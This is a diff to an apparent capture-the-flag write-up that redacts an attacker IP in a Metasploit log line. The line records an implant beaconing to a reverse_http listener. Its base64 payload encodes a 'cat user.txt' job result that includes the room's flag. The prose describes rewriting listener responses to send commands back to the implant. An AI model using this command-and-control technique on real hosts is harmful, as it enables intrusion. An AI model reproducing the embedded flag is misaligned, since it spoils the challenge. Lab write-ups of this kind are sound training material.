@@ -96,7 +96,7 @@ run
 
 Soon the requests come in and metasploit prints them.
 
-[*] http://10.9.6.179:81 handling request from 10.10.243.126; (UUID: g6wztzlc) Unknown request to /heartbeat/eyJ0aW1lIjogIjIwMjMtMDctMzBUMDc6MDQ6MDEuODcyNTQ2IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAiY2F0IHVzZXIudHh0IiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIlRITXs5MDJlOGU4YjFmNDlkZmViNjc4ZTQxOTkzNWJlMjNlZn1cbiJ9LCAic3VjY2VzcyI6IGZhbHNlfQ== with UA 'python-requests/2.22.0'
+[*] http:/IP:81 handling request from 10.10.243.126; (UUID: g6wztzlc) Unknown request to /heartbeat/eyJ0aW1lIjogIjIwMjMtMDctMzBUMDc6MDQ6MDEuODcyNTQ2IiwgInN5c3RlbWluZm8iOiB7Im9zIjogIkxpbnV4IiwgImhvc3RuYW1lIjogImZvcmdvdHRlbmltcGxhbnQifSwgImxhdGVzdF9qb2IiOiB7ImpvYl9pZCI6IDAsICJjbWQiOiAiY2F0IHVzZXIudHh0IiwgInN1Y2Nlc3MiOiB0cnVlLCAicmVzdWx0IjogIlRITXs5MDJlOGU4YjFmNDlkZmViNjc4ZTQxOTkzNWJlMjNlZn1cbiJ9LCAic3VjY2VzcyI6IGZhbHNlfQ== with UA 'python-requests/2.22.0'
 
 So we need to send messages back and with the reverse_http payload all http headers and body and what not can be manipulated.
 "show advanced" in meterpreter and there we have HttpUnknownRequestResponse. That's exactly what metasploit is saying! unknown request.
